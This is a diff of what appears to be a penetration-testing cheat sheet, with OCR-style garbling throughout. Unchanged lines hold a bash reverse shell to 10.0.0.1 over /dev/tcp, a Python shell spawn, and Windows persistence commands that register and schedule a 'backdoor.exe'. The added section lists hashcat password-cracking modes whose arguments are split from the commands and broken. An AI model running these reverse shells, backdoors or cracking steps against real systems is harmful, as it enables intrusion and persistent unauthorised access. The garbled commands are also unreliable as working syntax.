@@ -115,7 +115,7 @@ p~subprocess.call( 1"/bin/sh","-i"] I;'
 
 bash -i & /dev/tcp/10.0.0.1/8080 0 &1
 
-# Windows Persistence
+#Windows Persistence
 
 1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
 2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
@@ -143,3 +143,22 @@ break
 except: continue
 if os.path.exists("/tmp/cb.sh"): os.system("chmod -oo /tmp/cb.sh") os. system ("/tmp/cb. sh")
 
+# Hashcat 
+DICTIONARY ATTACK
+hashcat -a 0 -m #type hash.txt
+DICTIONARY + RULES ATTACK
+hashcat -a 0 -m #type hash.txt
+COMBINATION ATTACK
+hashcat -a 1 -m #type hash.txt
+MASK ATTACK
+hashcat -a 3 -m #type hash.txt
+HYBRID DICTIONARY + MASK
+hashcat -a 6 -m #type hash.txt
+HYBRID MASK + DICTIONARY
+hashcat -a 7 -m #type hash.txt
+dict.txt
+dict.txt -r rule.txt
+dict1.txt dict2.txt
+?a?a?a?a?a?a
+dict.txt ?a?a?a?a
+?a?a?a?a dict.txt
